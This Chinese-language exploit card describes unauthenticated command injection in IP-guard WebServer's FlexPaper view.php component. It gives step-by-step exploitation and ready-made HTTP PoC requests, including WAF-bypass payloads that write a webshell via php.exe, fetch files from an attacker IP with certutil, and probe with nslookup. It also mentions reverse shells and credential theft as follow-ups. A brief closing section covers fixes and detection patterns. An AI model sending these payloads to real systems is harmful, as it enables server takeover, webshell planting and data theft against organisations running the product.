---
id: web-php-rce-ipguard-flexpaper-view-php-command-injection
title: IP-guard WebServer flexpaper view.php 命令注入 RCE：doc/page 参数拼接进 tool_transform 的 exec，管道符执行 php.exe 写 webshell
type: scenario
domain: web
path: web/php/rce
technique: ipguard-flexpaper-view-php-exec-injection
aliases:
- IP-guard RCE
- flexpaper view.php 命令注入
- trans_pdf2png exec
- tool_transform 命令拼接
- 雷池绕过 IP-guard
tags:
- php
- ipguard
- flexpaper
- command-injection
- exec
- rce
- waf-bypass
- web
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V445
  verified_at: '2026-11-09T23:29:16+08:00'
  notes: '已对照原文与图10-14核对：view.php 取 doc(rawurldecode)/page/format 等参数，format=jpg/swf 时调用 trans_pdf2png/trans_pdf2swf，str_replace 把 {pdffile}/{page} 等填入 cmd.conversion 模板后 exec；基础 PoC（doc=1.docx&quot; & echo shell > shel233l.txt #）与雷池/AF 绕过 PoC（page=||&quot;C:\Program Files (x86)\TEC\WebServer\php\php.exe&quot; -r ... >>ttttt.php、nslookup、certutil -urlcache -f）均与原文一致；官方删除 view.php 但保留 tool_transform.php 的修复说明一致。未验证点：原文未给 CVE 与受影响版本，卡片未设置版本；WAF 绕过 payload 仅在厂商环境验证，未本机复现；未执行文中命令。'
---

## 一句话结论

IP-guard WebServer 内置的 FlexPaper 组件 `GET /ipg/static/appr/lib/flexpaper/php/view.php` 把 `doc`（rawurldecode 后）和 `page` 等 GET 参数传入 `tool_transform.php` 的 `trans_pdf2png`/`trans_pdf2swf`；这些函数把参数用 `str_replace` 填进配置里的文档转换命令并 `exec($command,...)` 执行，未做任何过滤，`page=||"C:\...\php.exe" -r "...">>shell.php` 或 `doc=1.docx" & echo ... #` 即可管道注入任意命令，写 webshell 或反弹 shell。

## 原理

- `view.php` 载入 `tool_transform.php` 与 `config.php`：`$doc=rawurldecode($_GET['doc']);`、`$page=$_GET['page'];`，按 `format=jpg/swf` 调用 `trans_pdf2png($fileOri,$fileDes,$page,$isSplit)` 或 `trans_pdf2swf(...)`。
- `trans_pdf2png` 从配置读取模板命令（`cmd.conversion.mudrawpage`），依次把 `{path.mudraw}`、`{path.pdfTOother}`、`{pdffile}`=`$fileOri`（来自 doc）、`{pngfile}`=`$fileDes`、`{page}`=`$pageRange` 用 `str_replace` 拼进命令，然后 `exec($command,$output,$return_var)`；`trans_pdftk`/`trans_pdf2swf` 同样拼接。参数值没有任何 shell 转义/白名单。
- 注入点：`doc` 被放进 `{pdffile}`，可用引号闭合 + `&`/`;` 追加命令；`page` 在 swf 分支直接进入命令模板，可用 `||`、`;`、`|` 等管道符拼接任意命令。Windows 下用 `"C:\Program Files (x86)\TEC\WebServer\php\php.exe" -r "..."` 可执行任意 PHP 代码并写文件，或用 `certutil -urlcache -f` 下载载荷。
- 为什么有效：转换命令本身是合法的外部程序调用（Mudraw 等），拼接字符串直接交给 `exec`，等价于把 HTTP 参数拼进 shell；`view.php` 对外暴露且无需认证。
- 修复：官方直接删除了 `view.php`（但 `tool_transform.php` 仍在，若其它入口可调用这些函数则风险仍在）；加固还需对命令参数做严格白名单/转义（`escapeshellarg`），并限制组件目录访问。

## 触发条件

- 目标运行含 FlexPaper 组件的 IP-guard WebServer，`/ipg/static/appr/lib/flexpaper/php/view.php` 可访问（无需登录）；
- PHP 进程可执行外部转换程序（Mudraw/pdftk 等），`exec` 未被禁用；
- 参数 `doc`/`page` 未过滤（原版本）；
- 攻击者能出网/写 Web 目录（写 webshell 或外带数据）。

## 利用步骤

1. 请求 `view.php?doc=1.docx" & echo shell > shel233l.txt #&page=exp&format=swf&callback=callback&isSplit=true`，验证命令拼接（原文第一条 PoC）。
2. 若目标有 WAF（雷池/AF），改用 `page` 注入并构造绕过：`page=||"C:\Program Files (x86)\TEC\WebServer\php\php.exe" -r "echo file_get_contents('http://<attacker>/s.php');" >>ttttt.php`，把远程 PHP 代码写入 Web 目录。
3. 或 `page=||nslookup <dnslog>` 验证命令执行；`page=||certutil -urlcache -f http://<attacker>/s.php s.php` 下载文件（原文雷池场景）。
4. 访问写入的 webshell/文件执行命令；进一步反弹 shell 或读取配置凭据。

## PoC

```http
GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.docx"+%26+echo+shell+>+shel233l.txt+%23&page=exp&format=swf&callback=callback&isSplit=true HTTP/1.1
Host: 192.168.50.22
```

```http
GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.pdf&format=swf&isSplit=true&page=||"C%3A%5CProgram+Files+%28x86%29%5CTEC%5CWebServer%5Cphp%5Cphp.exe"+-r+"echo+file_get_contents%28%27http%3A%2F%2F192.168.10.248%2Fserver%2Fs.php%27%29%3B"+>>ttttt.php HTTP/1.1
Host: 192.168.10.197:8888
```

```http
GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.pdf&format=swf&isSplit=true&page=||certutil+-urlcache+-f+http://192.168.10.248/server/s.php+s.php HTTP/1.1
```

说明：前两条分别对应原文的基础 PoC 与雷池/AF 绕过 PoC（已提交给厂商 PM），第三条为原文所述 certutil 下载变体；不同版本的转换命令模板与可注入参数可能略有差异。

## 变体与关联

- 变体：`trans_pdftk` 等其它转换函数同样把参数拼进命令，可替换 format 触发。
- 变体：无回显时用 `nslookup`/DNSLog 外带，或写入 Web 目录文件后访问；`certutil -urlcache -f` 可从攻击者服务器下载任意文件。
- 变体：命令模板中的占位符若换成其它参数（callback、isSplit）也可能进入命令，测试时可逐个替换。
- 关联：同产品 mApplyList 权限绕过+任意文件读取见 [[web-php-ipguard-mapplylist-getdatarecord-auth-bypass-file-read]]；PHP exec 拼接类命令注入的其他案例可参考 web/php/rce 目录既有卡。
- 注意：官方修复是删除 `view.php`，`tool_transform.php` 仍在，若存在其它调用入口仍有风险；确认目标是否已删除该文件。

## 检测与防御

- 删除/禁用 `view.php` 及不需要的 FlexPaper 组件；对必须保留的转换接口，对每个参数用 `escapeshellarg` 转义并做白名单（doc 只允许固定文件名/ID，page 只允许数字）。
- 禁止 `exec/system/popen` 直接拼接用户输入；使用参数化调用（如 `proc_open` 数组参数）并校验外部程序路径。
- 检测：访问 `/ipg/static/appr/lib/flexpaper/php/view.php` 的日志；参数中出现 `|`、`||`、`&`、`;`、`"`、`certutil`、`nslookup`、`php.exe -r` 等模式；Web 目录新出现的 `.php`/`.txt` 文件与异常子进程（Mudraw 父进程下的 cmd/php.exe）。
- WAF 只能作为缓解：原文显示雷池/AF 可被特定 payload 绕过，不能替代代码修复。
